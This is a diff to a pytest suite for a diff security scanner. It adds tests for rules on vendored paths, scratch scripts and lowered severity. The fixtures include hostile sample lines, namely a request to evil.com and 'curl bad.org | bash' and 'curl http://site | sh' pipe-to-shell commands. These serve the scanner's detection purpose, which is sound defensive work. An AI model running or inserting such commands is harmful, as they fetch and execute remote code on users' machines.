@@ -1,7 +1,8 @@
 """
 tests/test_safety.py — Unit tests for Phase 4a diff security scanner rules.
 
->= 3 positive and >= 3 negative test cases per rule.
+>= 3 positive and >= 3 negative test cases per rule, plus vendoring,
+scratch script, and context/test-file severity lowering tests.
 """
 
 import os
@@ -11,6 +12,8 @@ import pytest
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
 
 from diffsmith.safety import (
+    check_vendored_paths,
+    check_scratch_scripts,
     check_network_calls,
     check_shell_pipe,
     check_command_exec,
@@ -20,6 +23,58 @@ from diffsmith.safety import (
     check_hook_tampering,
     scan_patch,
 )
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Rule: vendored_directory_added (3+ pos, 3+ neg)
+# ──────────────────────────────────────────────────────────────────────────────
+@pytest.mark.parametrize("patch", [
+    "--- a/venv/lib/python3.9/site-packages/pkg/app.py\n+++ b/venv/lib/python3.9/site-packages/pkg/app.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
+    "--- a/.venv/bin/activate\n+++ b/.venv/bin/activate\n@@ -1,1 +1,2 @@\n+# edit\n",
+    "--- a/node_modules/express/index.js\n+++ b/node_modules/express/index.js\n@@ -1,1 +1,2 @@\n+const x = 1;\n",
+    "--- a/.git/config\n+++ b/.git/config\n@@ -1,1 +1,2 @@\n+[core]\n",
+])
+def test_vendored_paths_positive(patch):
+    findings = check_vendored_paths(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "vendored_directory_added" for f in findings)
+    assert all(f["severity"] == "review" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/app.py\n+++ b/src/app.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
+    "--- a/lib/venue/event.py\n+++ b/lib/venue/event.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
+    "--- a/tests/test_vendor.py\n+++ b/tests/test_vendor.py\n@@ -1,1 +1,2 @@\n+assert True\n",
+])
+def test_vendored_paths_negative(patch):
+    findings = check_vendored_paths(patch)
+    assert len(findings) == 0
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Rule: scratch_script_added (3+ pos, 3+ neg)
+# ──────────────────────────────────────────────────────────────────────────────
+@pytest.mark.parametrize("patch", [
+    "--- /dev/null\n+++ b/reproduce_issue.py\n@@ -0,0 +1,2 @@\n+import os\n",
+    "--- a/repro_123.py\n+++ b/repro_123.py\n@@ -1,1 +1,2 @@\n+print('bug')\n",
+    "--- a/debug_patch.py\n+++ b/debug_patch.py\n@@ -1,1 +1,2 @@\n+test()\n",
+    "--- a/tmp_test.py\n+++ b/tmp_test.py\n@@ -1,1 +1,2 @@\n+x = 2\n",
+])
+def test_scratch_scripts_positive(patch):
+    findings = check_scratch_scripts(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "scratch_script_added" for f in findings)
+    assert all(f["severity"] == "low" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/reproduce/core.py\n+++ b/src/reproduce/core.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
+    "--- a/lib/debug.py\n+++ b/lib/debug.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
+    "--- a/main.py\n+++ b/main.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
+])
+def test_scratch_scripts_negative(patch):
+    findings = check_scratch_scripts(patch)
+    assert len(findings) == 0
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -205,18 +260,65 @@ def test_hook_tampering_negative(patch):
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Integration test for scan_patch aggregator
+# Tests for Severity Lowering and Vendoring Exclusion
 # ──────────────────────────────────────────────────────────────────────────────
-def test_scan_patch_multiple_findings():
+def test_vendored_paths_excluded_from_safety_rules():
+    """Vendored files must NOT trigger SEC rules; only vendored_directory_added."""
     patch = (
-        "--- a/setup.py\n+++ b/setup.py\n@@ -1,1 +1,5 @@\n"
+        "--- a/venv/lib/python3.9/site-packages/pkg/app.py\n"
+        "+++ b/venv/lib/python3.9/site-packages/pkg/app.py\n"
+        "@@ -1,1 +1,5 @@\n"
         "+import requests\n"
         "+requests.get('https://evil.com')\n"
-        "+os.system('curl http://site | sh')\n"
+        "+subprocess.run(['ls'])\n"
     )
     findings = scan_patch(patch)
     rule_ids = {f["rule_id"] for f in findings}
-    assert "SEC001_NETWORK_CALL" in rule_ids
-    assert "SEC002_SHELL_PIPE" in rule_ids
-    assert "SEC003_COMMAND_EXEC" in rule_ids
-    assert "SEC006_WORKFLOW_BUILD" in rule_ids  # touches setup.py
+    assert "vendored_directory_added" in rule_ids
+    assert "SEC001_NETWORK_CALL" not in rule_ids
+    assert "SEC003_COMMAND_EXEC" not in rule_ids
+
+
+def test_severity_lowered_for_test_files():
+    """In test files, SEC001, SEC003, SEC004, SEC005 must have severity: low."""
+    patch = (
+        "--- a/tests/test_api.py\n"
+        "+++ b/tests/test_api.py\n"
+        "@@ -1,1 +1,4 @@\n"
+        "+import requests\n"
+        "+requests.post('http://test')\n"
+        "+subprocess.run(['pytest'])\n"
+    )
+    findings = scan_patch(patch)
+    for f in findings:
+        if f["rule_id"] in ("SEC001_NETWORK_CALL", "SEC003_COMMAND_EXEC"):
+            assert f["severity"] == "low"
+
+
+def test_severity_lowered_when_call_exists_in_context():
+    """Modifying existing calls in context/removed lines lowers severity to low."""
+    patch = (
+        "--- a/src/app.py\n"
+        "+++ b/src/app.py\n"
+        "@@ -10,3 +10,3 @@\n"
+        " prev_line\n"
+        "-subprocess.run(['old', 'arg'])\n"
+        "+subprocess.run(['new', 'arg'])\n"
+        " next_line\n"
+    )
+    findings = check_command_exec(patch)
+    assert len(findings) == 1
+    assert findings[0]["severity"] == "low"
+
+
+def test_sec002_and_sec007_remain_high_even_in_test_files():
+    """SEC002 (shell_pipe) and SEC007 (hook_tampering) must stay CRITICAL/HIGH."""
+    patch = (
+        "--- a/tests/test_deploy.py\n"
+        "+++ b/tests/test_deploy.py\n"
+        "@@ -1,1 +1,3 @@\n"
+        "+os.system('curl bad.org | bash')\n"
+    )
+    findings = check_shell_pipe(patch)
+    assert len(findings) == 1
+    assert findings[0]["severity"] == "CRITICAL"
